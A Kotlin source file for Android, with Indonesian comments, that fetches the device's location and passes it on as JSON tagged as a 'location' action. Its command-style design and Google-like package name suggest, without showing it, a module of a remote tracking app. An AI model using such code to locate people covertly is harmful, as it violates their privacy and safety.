package com.app.googlemodz

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Bundle
import android.os.Looper
import androidx.core.content.ContextCompat
import org.json.JSONObject

object LocationService {

    fun sendLast(ctx: Context, emit: (JSONObject) -> Unit) {
        val obj = JSONObject().put("action", "location")

        try {
            if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                obj.put("lat", 0.0)
                obj.put("lng", 0.0)
                obj.put("address", "Izin lokasi ditolak")
                emit(obj)
                return
            }

            val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager

            // Coba getLastKnownLocation dari semua provider yang tersedia
            var best: Location? = null
            try { best = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) } catch (e: Exception) {}
            if (best == null) { try { best = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) } catch (e: Exception) {} }
            if (best == null) { try { best = lm.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER) } catch (e: Exception) {} }

            if (best != null) {
                obj.put("lat", best.latitude)
                obj.put("lng", best.longitude)
                obj.put("address", "Lat: ${best.latitude}, Lng: ${best.longitude}")
                emit(obj)
                return
            }

            // Kalau null semua, request update dari GPS + Network
            val listeners = mutableListOf<LocationListener>()
            var emitted = false

            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    if (emitted) return
                    emitted = true
                    try {
                        val o = JSONObject().put("action", "location")
                        o.put("lat", location.latitude)
                        o.put("lng", location.longitude)
                        o.put("address", "Lat: ${location.latitude}, Lng: ${location.longitude}")
                        emit(o)
                    } catch (e: Exception) {}
                }
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }

            try { lm.requestLocationUpdates(LocationManager.GPS_PROVIDER, 1000L, 0f, listener, Looper.getMainLooper()) } catch (e: Exception) {}
            try { lm.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 1000L, 0f, listener, Looper.getMainLooper()) } catch (e: Exception) {}

            // Timeout 15 detik, kalau ga dapet juga kirim 0
            android.os.Handler(Looper.getMainLooper()).postDelayed({
                if (!emitted) {
                    emitted = true
                    try {
                        val o = JSONObject().put("action", "location")
                        o.put("lat", 0.0)
                        o.put("lng", 0.0)
                        o.put("address", "GPS belum ngasih lokasi, coba refresh lagi")
                        emit(o)
                    } catch (e: Exception) {}
                }
            }, 15000)

        } catch (e: Exception) {
            obj.put("lat", 0.0)
            obj.put("lng", 0.0)
            obj.put("address", "Error: ${e.message}")
            emit(obj)
        }
    }
}
